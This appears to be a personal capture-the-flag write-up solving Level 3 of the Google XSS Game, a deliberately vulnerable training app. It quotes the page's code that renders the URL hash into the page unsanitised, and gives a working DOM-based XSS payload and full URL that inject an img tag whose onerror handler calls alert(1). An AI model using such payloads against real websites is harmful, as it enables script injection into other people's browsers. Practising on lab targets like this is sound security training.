# Google XSS Game – Level 3: DOM-Based XSS via Location Hash

---

## 🎯 Mission Description  
This level demonstrates how JavaScript functions can act as **hidden execution sinks**, especially when user-controlled data is passed into the DOM using high-level APIs.  
In this case, the input comes from the **URL fragment (`#`)**, which is parsed and rendered into the page.

---

## 🎯 Mission Objective  
Inject a script that triggers `alert(1)` in the app.  
⚠️ You can’t input anything through the interface — the only way in is **manipulating the URL hash** (`#`).

---

## 🧪 Steps (My Approach)

1. 🔍 Viewed the page source and found the following code:

   ```javascript
   window.onload = function() { 
     chooseTab(unescape(self.location.hash.substr(1)) || "1");
   }

   function chooseTab(num) {
     var html = "Image " + parseInt(num) + "<br>";
     html += "<img src='/static/level3/cloud" + num + ".jpg' />";
     $('#tabContent').html(html);
   }
   ```

   → This shows that `location.hash` is passed directly into `innerHTML` — no sanitization. Vulnerable to **DOM-Based XSS**.

---

2. ✅ Crafted the following payload:
   
   ```
   #3+".jpg' /><img src=x onerror=alert(1)><!--
   ```

   🔗 Full URL:

   ```
   https://xss-game.appspot.com/level3/frame#3+".jpg'%20/><img%20src=x%20onerror=alert(1)><!--
   ```

   💥 Result:
   - The injected `<img>` tag is rendered and the `onerror` executes `alert(1)`
   - Mission solved!

---

## ✅ Final Payload

```html
#3+".jpg' /><img src=x onerror=alert(1)><!--
```

---

## 🧠 Notes  
- The input comes from `location.hash`, which is parsed and injected via `.innerHTML`
- No encoding or filtering is applied  
- A classic **DOM-Based XSS** case  
- You need to break the string and inject valid HTML with an event handler (e.g. `onerror`)
- No user input field — injection must be done in the **URL hash**

---

## ✅ Status: Solved 🎉
